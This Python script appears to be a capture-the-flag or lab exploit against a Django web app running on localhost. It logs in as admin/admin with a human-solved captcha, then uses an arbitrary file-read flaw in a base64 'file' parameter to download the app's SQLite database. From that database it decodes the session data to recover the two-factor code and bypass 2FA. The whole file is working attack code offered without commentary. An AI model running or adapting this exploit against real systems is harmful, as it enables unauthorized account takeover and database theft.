import requests
import re
import base64
from PIL import Image
from base64 import urlsafe_b64decode
import json
import zlib

def getImg(URL):
    return Image.open(requests.get(URL, stream=True).raw)

def main():
    URL = 'http://localhost:36743'
    sess = requests.Session()
    def login():
        LOGIN_URL = URL+'/login/'

        r = sess.get(LOGIN_URL)
        csrf_token = re.findall(r'name="csrfmiddlewaretoken" value="(.+?)"', r.text)[0]
        captcha_img = re.findall(r'<img src="(.+?)" alt="captcha" class="captcha" />', r.text)[0]
        key = re.findall(r'captcha/image/(.+?)/', captcha_img)[0]

        img = getImg(URL+'/'+captcha_img)
        img.show()
        captcha_ans = input(f'Please solve this captcha: {URL}/{captcha_img}')

        data = {
            "username": "admin",
            "password": "admin",
            "captcha_0": key,
            "captcha_1": captcha_ans,
            "csrfmiddlewaretoken": csrf_token,
        }
        r = sess.post(LOGIN_URL, data=data)
        if not '2FA code' in r.text:
            return login()
        return
    
    def _2fa(code):
        _2FA_URL = URL+'/2fa/'
        data = {
            "code": code,
            "csrfmiddlewaretoken": sess.cookies['csrftoken'],
        }
        r = sess.post(_2FA_URL, data=data)
        if not 'Dashboard' in r.text:
            return False
        return r.text
    
    def get_file(path):
        FILE_URL = URL+'/image/?file='+base64.b64encode(path.encode()).decode()
        return sess.get(FILE_URL).content
    
    def get_2fa(db, sessionid):
        import sqlite3
        
        # save db
        with open('db.sqlite3', 'wb') as f:
            f.write(db)
        
        conn = sqlite3.connect('db.sqlite3')
        c = conn.cursor()
        session_data = c.execute(f'SELECT session_data FROM django_session WHERE session_key=?', (sessionid,)).fetchone()[0]
        session_data = session_data[1:].split(':')[0]
        session_data = urlsafe_b64decode(session_data+'==')
        session_data = zlib.decompress(session_data)
        session_data = json.loads(session_data)
        return session_data['2fa_code']



    login()
    sessionid = sess.cookies.get_dict()['sessionid']

    db = get_file('db.sqlite3')
    with open('db.sqlite3', 'wb') as f:
        f.write(db)

    code = get_2fa(db, sessionid)
    print(_2fa(code))

main()